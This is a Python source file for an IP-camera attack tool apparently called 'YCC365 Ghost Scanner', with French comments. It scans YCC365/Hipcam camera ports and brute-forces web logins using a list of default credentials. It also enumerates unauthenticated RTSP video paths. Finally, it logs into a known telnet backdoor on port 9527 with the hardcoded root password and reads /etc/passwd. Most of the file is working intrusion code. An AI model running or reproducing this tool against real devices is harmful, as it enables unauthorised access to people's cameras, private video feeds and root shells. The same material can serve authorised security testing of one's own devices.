"""
YCC365 Ghost Scanner — Core Engine
Signé Ghost1o1 — Moteur de scan 5 phases

Classes principales:
    GhostScanner — Orchestrateur
    ScanResult   — Résultat structuré
"""

import socket
import subprocess
import time
import json
from datetime import datetime
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from .usernames import UsernameArsenal
from .cloudmapper import CloudDomainMapper
from .serialintel import DeviceSerialIntel
from .firmware_meta import FirmwareMetadataExtractor


class Severity(Enum):
    CRITICAL = "🔴 CRITICAL"
    HIGH = "🟠 HIGH"
    MEDIUM = "🟡 MEDIUM"
    LOW = "🟢 LOW"
    INFO = "⚪ INFO"


class ScanPhase(Enum):
    PORT_SCAN = "Phase 1: Port Scan"
    BRUTEFORCE = "Phase 2: Bruteforce Credentials"
    RTSP = "Phase 3: RTSP Detection"
    TELNET_BD = "Phase 4: Telnet Backdoor"
    ONVIF = "Phase 5: ONVIF Probe"
    USERNAME_ARSENAL = "Phase 6: Username Arsenal (Sherlock)"
    CLOUD_MAPPER = "Phase 7: Cloud Domain Mapper"
    DEVICE_SERIAL_INTEL = "Phase 8: Device Serial Intel (PhoneIntel)"
    FIRMWARE_METADATA = "Phase 9: Firmware Metadata Extractor (ImageDeepScan)"


@dataclass
class PortInfo:
    port: int
    state: str  # "open" | "closed" | "filtered"
    service: str
    banner: Optional[str] = None


@dataclass
class CredentialTest:
    user: str
    password: str
    port: int
    success: bool
    http_code: Optional[int] = None
    evidence: Optional[str] = None


@dataclass
class RTSPPath:
    path: str
    accessible: bool
    response_code: Optional[int] = None
    server_banner: Optional[str] = None


@dataclass
class ScanResult:
    target: str
    timestamp: str
    duration_seconds: float
    open_ports: List[PortInfo] = field(default_factory=list)
    valid_credentials: List[CredentialTest] = field(default_factory=list)
    rtsp_paths: List[RTSPPath] = field(default_factory=list)
    telnet_backdoor_active: bool = False
    onvif_info: Dict = field(default_factory=dict)
    username_arsenal: Dict = field(default_factory=dict)
    cloud_mapper: Dict = field(default_factory=dict)
    device_serial_intel: Dict = field(default_factory=dict)
    firmware_metadata: Dict = field(default_factory=dict)
    vulnerabilities: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return asdict(self)

    def to_json(self, indent: int = 2) -> str:
        return json.dumps(self.to_dict(), indent=indent, default=str)

    def save_report(self, path: Optional[Path] = None) -> Path:
        if path is None:
            path = Path(f"/tmp/ycc365_{self.target}_{datetime.utcnow():%Y%m%d_%H%M%S}.json")
        path.write_text(self.to_json())
        return path


class GhostScanner:
    """
    Scanner YCC365/Hipcam SDK.

    Usage:
        scanner = GhostScanner(target="192.168.1.100")
        result = scanner.run_full_scan()
        result.save_report()
    """

    YCC365_PORTS = [
        (34567, "YCC365 admin"),
        (34599, "YCC365 login"),
        (9527,  "Telnet backdoor"),
        (554,   "RTSP"),
        (8000,  "HTTP admin alt"),
        (8899,  "ONVIF"),
        (80,    "HTTP"),
        (443,   "HTTPS"),
        (23,    "Telnet"),
        (8080,  "HTTP-Alt"),
        (8081,  "HTTP-Backup"),
        (8443,  "HTTPS-Alt"),
        (5552,  "ADB"),
        (37777, "Dahua"),
        (5000,  "UPnP"),
        (81,    "Camera web"),
    ]

    DEFAULT_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "888888"),
        ("admin", "666666"),
        ("admin", "123"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "111111"),
        ("admin", "000000"),
        ("admin", "999999"),
        ("admin", "abc123"),
        ("admin", "admin123"),
        ("user", "user"),
        ("user", "12345"),
        ("user", "password"),
        ("root", "root"),
        ("root", "xmhdipc"),  # Hipcam backdoor
        ("root", "12345"),
        ("root", "pass"),
        ("support", "support"),
        ("service", "service"),
        ("guest", "guest"),
        ("operator", "operator"),
    ]

    RTSP_PATHS = [
        "/onvif/streaming/channels/101",
        "/streaming/channels/101",
        "/11",
        "/12",
        "/live/ch00_0",
        "/live/main",
        "/live/sub",
        "/live/0/main",
        "/live/0/sub",
        "/user=admin&password=&channel=1&stream=0.sdp",
        "/av0_0",
        "/video/main",
        "/mpeg4",
        "/cam/realmonitor",
        "/0/usrnm:admin/0/usrpw:admin/0/1",
        "/Streaming/Channels/101",
        "/Streaming/Channels/1",
        "/Streaming/Channels/2",
        "/h264",
        "/h264/ch01/main/av_stream",
        "/trackID=1",
    ]

    def __init__(self, target: str, timeout: float = 2.0):
        self.target = target
        self.timeout = timeout
        self.result = ScanResult(
            target=target,
            timestamp=datetime.utcnow().isoformat(),
            duration_seconds=0.0,
        )

    def run_full_scan(self) -> ScanResult:
        """Exécute les 5 phases du scan."""
        start_time = time.time()

        print(f"\n🎯 Cible: {self.target}")
        print(f"⏱️  Démarrage: {self.result.timestamp}\n")

        self.phase1_port_scan()
        self.phase2_bruteforce()
        self.phase3_rtsp()
        self.phase4_telnet_backdoor()
        self.phase5_onvif()
        self.phase6_username_arsenal()
        self.phase7_cloud_mapper()
        self.phase8_device_serial_intel()
        self.phase9_firmware_metadata()

        self.result.duration_seconds = round(time.time() - start_time, 2)
        return self.result

    def phase1_port_scan(self) -> None:
        """Phase 1: Scan des 16 ports YCC365."""
        print("═══ Phase 1: Port Scan ═══")
        for port, service in self.YCC365_PORTS:
            info = self._tcp_connect(port, service)
            if info:
                self.result.open_ports.append(info)
                print(f"  [OPEN] {port} ({service})")

    def phase2_bruteforce(self) -> None:
        """Phase 2: Bruteforce credentials sur ports HTTP ouverts."""
        print("\n═══ Phase 2: Bruteforce ═══")
        http_ports = [
            p.port for p in self.result.open_ports
            if p.port in (80, 443, 8000, 8080, 34567, 34599)
        ]

        if not http_ports:
            print("  [!] Aucun port HTTP ouvert")
            return

        for port in http_ports:
            print(f"  [*] Test port {port}...")
            for user, password in self.DEFAULT_CREDENTIALS:
                result = self._http_basic_auth(port, user, password)
                if result.success:
                    print(f"  [VALID] {user}:{password} (HTTP {result.http_code})")
                    self.result.valid_credentials.append(result)

    def phase3_rtsp(self) -> None:
        """Phase 3: Test RTSP + énumération paths."""
        print("\n═══ Phase 3: RTSP ═══")
        rtsp_open = any(p.port == 554 for p in self.result.open_ports)

        if not rtsp_open:
            print("  [!] Port 554 fermé")
            return

        for path in self.RTSP_PATHS:
            result = self._rtsp_check(path)
            self.result.rtsp_paths.append(result)
            if result.accessible:
                print(f"  [ACCESSIBLE] {path}")

    def phase4_telnet_backdoor(self) -> None:
        """Phase 4: Backdoor Telnet Hipcam port 9527."""
        print("\n═══ Phase 4: Telnet Backdoor ═══")
        bd_open = any(p.port == 9527 for p in self.result.open_ports)

        if not bd_open:
            print("  [!] Port 9527 fermé")
            return

        print("  [*] Test root/xmhdipc...")
        try:
            proc = subprocess.run(
                ["timeout", "5", "ncat", "-nv", self.target, "9527"],
                input=b"root\nxmhdipc\ncat /etc/passwd\n",
                capture_output=True,
                timeout=10,
            )
            output = proc.stdout.decode("utf-8", errors="ignore")
            if "root@" in output or "/bin/" in output:
                self.result.telnet_backdoor_active = True
                print("  [CRITICAL] BACKDOOR ACTIF!")
                self.result.vulnerabilities.append({
                    "id": "VULN-001",
                    "title": "Telnet Backdoor Active",
                    "cvss": 9.8,
                    "severity": "CRITICAL",
                    "cwe": "CWE-798",
                    "evidence": output[:200],
                })
        except (FileNotFoundError, subprocess.TimeoutExpired):
            print("  [!] ncat non installé ou timeout")

    def phase5_onvif(self) -> None:
        """Phase 5: ONVIF probe sans auth."""
        print("\n═══ Phase 5: ONVIF ═══")
        onvif_open = any(p.port == 8899 for p in self.result.open_ports)

        if not onvif_open:
            print("  [!] Port 8899 fermé")
            return

        try:
            response = subprocess.run(
                ["curl", "-s", "-m", "5", "-X", "POST",
                 "-H", "Content-Type: application/soap+xml",
                 "-d", '<?xml version="1.0"?><Envelope xmlns="http://www.w3.org/2003/05/soap-envelope"><Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></Body></Envelope>',
                 f"http://{self.target}:8899/onvif/device_service"],
                capture_output=True,
                timeout=10,
            )
            body = response.stdout.decode("utf-8", errors="ignore")

            if "Manufacturer" in body or "Model" in body:
                import re
                self.result.onvif_info = {
                    "manufacturer": re.search(r"<Manufacturer>([^<]+)", body).group(1) if "Manufacturer" in body else "",
                    "model": re.search(r"<Model>([^<]+)", body).group(1) if "Model" in body else "",
                    "firmware": re.search(r"<FirmwareVersion>([^<]+)", body).group(1) if "FirmwareVersion" in body else "",
                    "serial": re.search(r"<SerialNumber>([^<]+)", body).group(1) if "SerialNumber" in body else "",
                }
                print(f"  [ONVIF] {self.result.onvif_info}")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    def phase6_username_arsenal(self) -> None:
        """Phase 6: Username Arsenal — 58 usernames × 19 passwords (Sherlock-style)."""
        print("\n═══ Phase 6: Username Arsenal (Sherlock-style) ═══")
        http_ports = [
            p.port for p in self.result.open_ports
            if p.port in (80, 443, 8000, 8080, 34567, 34599)
        ]
        if not http_ports:
            print("  [!] Aucun port HTTP ouvert")
            self.result.username_arsenal = {"hits": [], "stats": {}}
            return

        arsenal = UsernameArsenal(self.target, timeout=self.timeout)
        hits = arsenal.run(http_ports=http_ports)
        self.result.username_arsenal = {
            "hits": [hit.__dict__ for hit in hits],
            "stats": arsenal.stats(),
        }

    def phase7_cloud_mapper(self) -> None:
        """Phase 7: Cloud Domain Mapper — cartographie 42 domaines XMEYE/YCC365."""
        print("\n═══ Phase 7: Cloud Domain Mapper ═══")
        mapper = CloudDomainMapper(self.target, timeout=5.0)
        results = mapper.run()
        self.result.cloud_mapper = {
            "domains": [r.to_dict() for r in results],
            "stats": mapper.stats(),
        }

    def phase8_device_serial_intel(self) -> None:
        """Phase 8: Device Serial Intel — MAC + Serial + IP + BSSID lookup (adapté PhoneIntel)."""
        print("\n═══ Phase 8: Device Serial Intel ═══")

        # Récupérer MAC depuis ARP table (Linux) si dispo
        identifiers = {"ip": self.target}

        # Look for ONVIF UUID from previous phase
        onvif_serial = None
        if isinstance(self.result.onvif_info, dict):
            onvif_serial = self.result.onvif_info.get("serial") or self.result.onvif_info.get("uuid")

        if onvif_serial:
            identifiers["serial"] = onvif_serial

        intel = DeviceSerialIntel(self.target, timeout=self.timeout)
        hits = intel.run(identifiers=identifiers)
        self.result.device_serial_intel = {
            "hits": [h.to_dict() for h in hits],
            "stats": intel.stats(),
        }

    def phase9_firmware_metadata(self) -> None:
        """Phase 9: Firmware Metadata Extractor — banners + EXIF + firmware analysis (adapté ImageDeepScan)."""
        print("\n═══ Phase 9: Firmware Metadata Extractor ═══")

        # Récupérer les domaines cloud mappés (de la phase 7)
        cloud_domains = []
        if isinstance(self.result.cloud_mapper, dict):
            cloud_domains = [
                d["domain"] for d in self.result.cloud_mapper.get("domains", [])
                if d.get("reachable")
            ][:10]

        extractor = FirmwareMetadataExtractor(self.target, timeout=5.0)
        findings = extractor.run(cloud_domains=cloud_domains)
        self.result.firmware_metadata = {
            "findings": [f.to_dict() for f in findings],
            "stats": extractor.stats(),
        }

    def _tcp_connect(self, port: int, service: str) -> Optional[PortInfo]:
        try:
            with socket.create_connection((self.target, port), timeout=self.timeout):
                return PortInfo(port=port, state="open", service=service)
        except (socket.timeout, ConnectionRefusedError, OSError):
            return None

    def _http_basic_auth(self, port: int, user: str, password: str) -> CredentialTest:
        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "3", "-o", "/dev/null",
                 "-w", "%{http_code}",
                 "-u", f"{user}:{password}",
                 f"http://{self.target}:{port}/"],
                capture_output=True,
                timeout=5,
            )
            code = int(result.stdout.decode().strip() or "0")
            return CredentialTest(
                user=user,
                password=password,
                port=port,
                success=code in (200, 301, 302),
                http_code=code,
            )
        except (subprocess.TimeoutExpired, ValueError, FileNotFoundError):
            return CredentialTest(
                user=user, password=password, port=port, success=False
            )

    def _rtsp_check(self, path: str) -> RTSPPath:
        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "3", "-o", "/dev/null",
                 "-w", "%{http_code}",
                 "-X", "DESCRIBE",
                 f"rtsp://{self.target}:554{path}"],
                capture_output=True,
                timeout=5,
            )
            code = int(result.stdout.decode().strip() or "0")
            return RTSPPath(
                path=path,
                accessible=code in (200, 301),
                response_code=code,
            )
        except (subprocess.TimeoutExpired, ValueError, FileNotFoundError):
            return RTSPPath(path=path, accessible=False)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    scanner = GhostScanner(target)
    result = scanner.run_full_scan()
    filepath = result.save_report()
    print(f"\n✅ Rapport: {filepath}")
